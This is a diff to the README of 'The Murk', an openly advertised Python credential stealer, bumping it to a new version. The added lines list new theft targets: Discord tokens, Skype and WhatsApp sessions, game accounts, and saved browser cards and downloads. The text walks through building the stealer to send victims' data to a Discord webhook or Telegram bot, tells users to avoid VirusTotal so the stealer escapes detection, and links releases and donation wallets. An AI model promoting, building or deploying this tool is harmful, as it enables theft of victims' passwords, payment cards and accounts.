@@ -4,14 +4,12 @@
 <img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white">
 <img src="https://img.shields.io/badge/tests-100/100-76B900?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
-<img src="https://img.shields.io/badge/The%20Murk-v7.1.0-blue?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/The%20Murk-v8.0.1-blue?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/platform-windows-989898?style=for-the-badge&logo=&logoColor=whit">
 
 
 🔐open source turbo🚀 stealer written on Python, all logs will be sent using discord webhooks, telegram bot or XMPP bot.
-[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v7.1.0)
-
-💪Huge update soon
+[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v8.0.1)
 
 ⭐Please, star this repo if it was helpful⭐
 
@@ -30,6 +28,7 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
 * ✅System info
     * ⌚Time
     * 💻OS
+    * 💻HWID
     * 🔩CPU
         * 📜Cores
         * 📜CPU frequency
@@ -59,12 +58,16 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
 * 🪁Messagers
    * 📢Telegram sessions
    * 📢Viber sessions
-   * 📢Discord sessions
+   * 📢Discord sessions + token-grabber
+   * 📢Skype sessions
+   * 📢WhatsApp sessions
    * 📢And more
 * ⚔Game
    * ♠Steam
    * ♠Epic Games
    * ♠Uplay
+   * ♠Roblox
+   * ♠Minecraft
    * ♠And more
 * 💳Wallets
    * 💵PayPal
@@ -78,22 +81,32 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
         * 🔑Passwords
         * 🔐Cookies
         * 📝History
+        * 📥Downloads
+        * 💳Cards
     * 🔗Firefox
         * 🔑Passwords
         * 🔐Cookies
         * 📝History
+        * 📥Downloads
+        * 💳Cards
     * 🔗Opera
         * 🔑Passwords
         * 🔐Cookies
         * 📝History
+        * 📥Downloads
+        * 💳Cards
     * 🔗Edge
         * 🔑Passwords
         * 🔐Cookies
         * 📝History
+        * 📥Downloads
+        * 💳Cards
     * 🔗Brave
         * 🔑Passwords
         * 🔐Cookies
         * 📝History
+        * 📥Downloads
+        * 💳Cards
     * 🔗And more
 * ✅Other
     * 📸Sreenshot
@@ -104,17 +117,14 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
 ### 🔨Builder
 
 ### 🎮For Discord
-So firstly you need to download [python](https://www.python.org/downloads/). Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v7.1.0). 
+__So firstly you need to download [python](https://www.python.org/downloads/). Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v8.0.1). 
 After that, you need to create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks#conclusion).
-Finally, insert the name and webhook link in the builder. And wait, secure building will take about 2 minutes.
+Finally, insert the name and webhook link in the builder. And wait, secure building will take about 2 minutes.__
 
 ### 📨For Telegram
 So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. Then, you need to save token and bot name. 
-Now you need to get your chat id. To do this, go to the next bot [@chatid_echo_bot](https://t.me/chatid_echo_bot) and save the id.  
+Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and save the id.  
 Insert this data in builder console. And wait, secure building will take about 2 minutes.
-
-### 📡For XMPP (Advanced users only):
-Goto https://xmpp.org/getting-started/ and go through the process, once completed you need to make sure messages are being archived and saved to disk, find that option in your client’s settings. After that input your XMPP login into the stealer and either create a group chat or use your own Jabber ID as the "jabberreceiver" variable. As for group chats you need to find the following "groupchatname@conference.xmppserver.com". 
 
 ---
 ### ❌Builder errors
@@ -127,6 +137,9 @@ How to solve it read [here](https://www.stechies.com/pip-not-recognized-internal
 
 ---
 ### 🧾Results(logs)
+Example of message in Discord
+
+![LOGO](Images/example1.png)
 
 ![LOGO](Images/example.png)
 
@@ -135,7 +148,7 @@ How to solve it read [here](https://www.stechies.com/pip-not-recognized-internal
    <a href="https://www.donationalerts.com/r/nick_vinesmoke"><img src="https://img.shields.io/badge/Donationalerts-F37623?style=for-the-badge&logo=Cash%20App&logoColor=white"></a>
    <a href="https://patreon.com/NickVinesmoke"><img src="https://img.shields.io/badge/Patreon-F96854?style=for-the-badge&logo=patreon&logoColor=white"></a>
    
-  BTC <code>bc1qfe46xsewu00yhl0llzaxhz9re03y4al0w9p3v2</code>
+   BTS <code>bc1qfe46xsewu00yhl0llzaxhz9re03y4al0w9p3v2</code>
   
   ETH <code>0xeeA063838950D191881EdF0E31b4699B73aD20Ac</code>
   
